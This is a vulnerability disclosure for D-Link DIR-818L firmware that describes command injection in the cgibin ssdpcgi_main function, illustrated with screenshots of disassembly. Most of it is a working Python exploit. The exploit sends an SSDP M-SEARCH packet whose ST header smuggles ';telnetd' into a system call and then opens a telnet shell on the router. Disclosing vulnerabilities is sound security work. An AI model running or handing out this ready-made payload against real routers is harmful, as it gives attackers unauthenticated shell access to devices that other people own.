# Firmware:
DIR818L_FW105b01 A1:
# Detail:
Command execution exists in the cgibin binary
The ssdpcgi_main function has a command execution vulnerability caused by unfiltered parameters

![O)MM35GBCV_NA`DN}BHG)OB](https://user-images.githubusercontent.com/84966968/178105747-1dc9b8cc-6b03-48d4-bee0-f3c51414cc2c.png)

![KKMPAI5U05DZM145}(43`RU](https://user-images.githubusercontent.com/84966968/178105767-a5f75f13-cb88-4962-a31d-3feb8c7dc778.png)

lxmldbc_system：

![2O$$QJZ%6M@FEJUSVEU(7AF](https://user-images.githubusercontent.com/84966968/178105811-1e9c87dd-0b46-466c-a182-626da2fcff28.png)

You can see that the environment variables are concatenated directly into the system command without filtering
# poc：
```
import sys
import os
import socket
from time import sleep
def config_payload(ip, port):
    header = "M-SEARCH * HTTP/1.1\n"
    header += "HOST:"+str(ip)+":"+str(port)+"\n"
    header += "ST:urn:device:1;telnetd\n"
    header += "MX:2\n"
    header += 'MAN:"ssdp:discover"'+"\n\n"
    return header
def send_conexion(ip, port, payload):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
    sock.sendto(payload,(ip, port))
    sock.close()
if __name__== "__main__":
    ip = raw_input("Router IP: ")
    port = 1900

headers = config_payload(ip, port)
send_conexion(ip, port, headers)
sleep(5)
os.system('telnet ' + str(ip))
```
![0SOP(3D2535@D%$S4@UNTUP](https://user-images.githubusercontent.com/84966968/178105914-f00d0cdf-c38c-4e3c-9059-bd30cd36bf89.png)

I looked it up online and it looks like it's been there for a long time
